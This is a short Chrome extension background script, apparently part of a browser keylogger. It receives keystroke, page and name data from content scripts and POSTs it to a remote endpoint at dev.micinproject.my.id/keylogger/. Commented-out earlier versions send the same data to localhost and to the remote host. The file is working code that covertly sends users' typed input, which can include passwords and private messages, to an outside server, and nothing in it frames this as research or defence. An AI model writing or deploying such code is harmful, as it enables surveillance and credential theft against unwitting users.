function handleMessage (request) {
	data = "key="+request.key+"&page="+request.page+"&name="+request.name+"&log_id="+request.log_id;

	// var xhr = new XMLHttpRequest();
	// xhr.onload = function(){
	// 	console.log(this.responseText);
	// }
	// xhr.open("POST", "http://localhost/keylogger/",true);
	// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	// xhr.send(data);

	// FETCH
	console.log(request);
	fetch("https://dev.micinproject.my.id/keylogger/", {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded"
        },
        body: data
    })
    .then(response => {
        // console.log(response);
    })
    .catch(error => {
        // console.error(error);
    });
}
chrome.runtime.onMessage.addListener(handleMessage);

// work 1

// function handleMessage(request) {
//   // Pastikan properti log_id ada dalam objek request
//   if ("log_id" in request) {
//     data = {
//       log_id: request.log_id,
//       key: request.key,
//       page: request.page,
//       name: request.name
//     };

//     	fetch("https://dev.micinproject.my.id/keylogger", {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/x-www-form-urlencoded"
//         },
//         body: data
//     })
//     .then(response => {
//         console.log(response);
//     })
//     .catch(error => {
//         console.error(error);
//     });
//     // ... Rest of the code for sending data to the server or processing it as needed
//     // For now, we will just log the data in the console
//     // console.log(data);
//   } else {
//     console.log("log_id not found in the request object.");
//   }
// }

// chrome.runtime.onMessage.addListener(handleMessage);
